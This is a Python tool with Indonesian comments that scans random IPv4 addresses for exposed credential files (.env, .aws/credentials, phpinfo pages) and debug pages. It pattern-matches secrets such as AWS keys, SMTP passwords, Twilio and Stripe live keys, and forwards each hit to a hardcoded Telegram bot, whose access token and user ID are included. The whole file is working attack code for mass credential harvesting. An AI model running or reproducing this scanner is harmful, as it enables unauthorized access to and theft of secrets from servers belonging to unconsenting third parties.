from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
import threading
import queue
import requests
import re
import time
import struct
import random
import socket
import telebot
import sys

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ====  EDIT BAGIAN INI ====
env_path = (".env", ".env.bak", "aws.yml", "config/aws.yml", ".ec2/credentials.conf", ".ses/credentials",
            "phpinfo", ".aws/credentials", "phpinfo.php", "info.php", "ses/credentials.conf", ".env.old", ".env_old", ".env_bak", ".env.example")
keywords = (
    "NEXMO", "NEXMO_KEY",
    "SENDGRID",
    "AWS_SQS", "SQS_KEY", "SQS_ACCESS_KEY",
    "AWS_SNS", "SNS_KEY", "SNS_ACCESS_KEY",
    "AWS_S3", "S3_ACCESS_KEY", "S3_KEY",
    "AWS_SES", "SES_ACCESS_KEY", "SES_KEY",
    "AWS_KEY", "AWS_ACCESS_KEY",
    "DYNAMODB_ACCESS_KEY", "DYNAMODB_KEY",
    "PLIVO",
    "smtp.office365",
    "smtp.ionos",
    "TWILIO", "twilio",
    "CakePHP", "cakephp", "Cake\Http",
    "*****",
    "VONAGE_KEY", "VONAGE_API", "VONAGE",
    "vonage_key", "vonage_api", "vonage",
    "account_sid", "ACCOUNT_SID",
    "toggle vendor stack frames",
    "toggle arguments", " Toggle Arguments", "toggle arguments",
    "django", "python",
    "email-smtp",
    "sk_live", "pk_live",
    "aws_access_key_id",
    "SMTP_HOST", "MAIL_USERNAME", "MAIL_PASSWORD")

TELEGRAM_ACCESS_TOKEN = "2075931124:AAE6x5Vfm808auWhFBbunEC8mVaPXPwE6YI"
USER_ID = 1123476832
SEND_IN_SECONDS = 1
PRINT_SITE_DOWN = True

# ==== STOP ======

client = telebot.TeleBot(TELEGRAM_ACCESS_TOKEN)

xhreg = None

try:
    client.get_me()
    client.get_chat(USER_ID)

    ch = input("""
\x1b[92m  ___        _       ______       _            __
 / _ \      | |      | ___ \     | |          /  |
/ /_\ \_   _| |_ ___ | |_/ / ___ | |_  __   __`| |
|  _  | | | | __/ _ \| ___ \/ _ \| __| \ \ / / | |
| | | | |_| | || (_) | |_/ / (_) | |_   \ V / _| |_
\_| |_/\__,_|\__\___/\____/ \___/ \__|   \_/  \___/\x1b[0m

1. lock head ip
2. auto
choose: """.strip("\n"))

    assert ch in ["1", "2"]

    if ch == "1":
        xhreg = re.compile(r"^(?:%s)\." % (
            "|".join(map(
              re.escape, re.split(r"\s*,\s*", input("input head: "))
            ))
        ))
    thread = int(input("thread: "))
except Exception as e:
    exit("Error: " + str(e))

q = queue.Queue()
s = []
stop = False
lock = threading.Lock()

alias = {i[0].upper(): i[1] for i in keywords if not isinstance(i, str)}
xreg = re.compile(
    r"|".join(re.escape(i if isinstance(i, str) else i[0]) for i in keywords), re.I)


def is_alive(url):
    try:
        r = requests.head(url, timeout=3, allow_redirects=True)
        return r.status_code
    except Exception as e:
        return False


def send_worker():
    while not stop:
        while len(s) > 0:
            item = s.pop(0)
            print("\x1b[92m%s\x1b[0m: sending msg:\n%s" % (threading.currentThread().name, item))
            client.send_message(USER_ID, item, parse_mode="Markdown")
        time.sleep(SEND_IN_SECONDS)


def worker():
    while not stop:
        url = q.get()
        try:
            parsed = urlparse(url)
            url = "http://{}".format(
                parsed.netloc or url.split("/", 1)[0].split("|")[0])
            tname = threading.currentThread().name

            if is_alive(url):
                result = None
                method = ""

                try:
                    print("\x1b[34m%s\x1b[0m: %s (POST)" % (tname, url))
                    r = requests.post(url, data=[],
                                      verify=False, timeout=3,
                                      headers={'User-agent': 'Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'})
                    res_t = set(xreg.findall(r.text))
                    if len(res_t) > 0:
                        method = "DEBUG"
                        result = res_t

                except Exception:
                    pass

                if result is None:
                    for path in env_path:
                        try:
                            print(
                                "\x1b[34m%s\x1b[0m: %s/%s (GET)" % (tname, url, path))
                            r = requests.get("/".join([url, path]), allow_redirects=False,
                                             verify=False, timeout=3,
                                             headers={'User-agent': 'Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'})
                            res_t = set(xreg.findall(r.text))
                            if len(res_t) > 0:
                                method = path
                                result = res_t
                                break
                        except Exception as e:
                            continue

                if result is not None:
                    print(
                        "\x1b[92m%s\x1b[0m:: found %s matches credentials: \x1b[92m%s\x1b[0m (%s)" % (tname, len(result), url, method))


                    ip = re.sub(r"^https?://", "", url)
                    try:
                        host = socket.gethostbyaddr(ip)[0]
                        if is_alive(host):
                           url = "http://" + host
                    except Exception:
                        pass

                    php_version = "unknown"
                    if hasattr(r, "text"):
                        res = re.search(r"php version ([^<]+)", r.text, re.I)
                        if res is not None:
                            php_version = res.group(1)

                    x = ("- url: %s\n"
                         "- ip: `%s`\n"
                         "- method: `%s`\n"
                         "- php version: `%s`\n"
                         "- found: " % (url + ("/" + method if method != "DEBUG" else ""),
                                        ip, method, php_version))

                    x += ", ".join(set("`%s`" % alias.get(
                        name.upper(), name).upper() for name in result))

                    with lock:
                        s.append(x)
                else:
                    print("\x1b[91m%s\x1b[0m: %s: \x1b[93mNo Credentials\x1b[0m" % (tname, url))
            else:
                if PRINT_SITE_DOWN:
                    print("\x1b[91m%s\x1b[0m: %s: Site Down!" % (tname, url))
        except Exception as e:
            if hasattr(e, "args") and len(e.args) == 2:
                e = e.args[1]
            print("\x1b[91m%s\x1b[0m: Error: %s" % (tname, str(e).strip()))
        q.task_done()


def rand_v4():
    while not stop:
        ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        if xhreg is None or xhreg.search(ip):
            yield ip


th = threading.Thread(target=send_worker)
th.setDaemon(True)
th.start()

threads = [th]

try:
    for _ in range(thread):
        th = threading.Thread(target=worker)
        th.setDaemon(True)
        th.start()

        threads.append(th)

    for line in rand_v4():
        while q.qsize() > thread:
            continue
        q.put(line)

    q.join()

except:
    pass

try:
    stop = True
    for i in threads:
        if i.is_alive() and not q.empty():
            print("\x1b[93m%s\x1b[0m: waiting for the data to finish processing" % i.name)
            i.join()
except:
    pass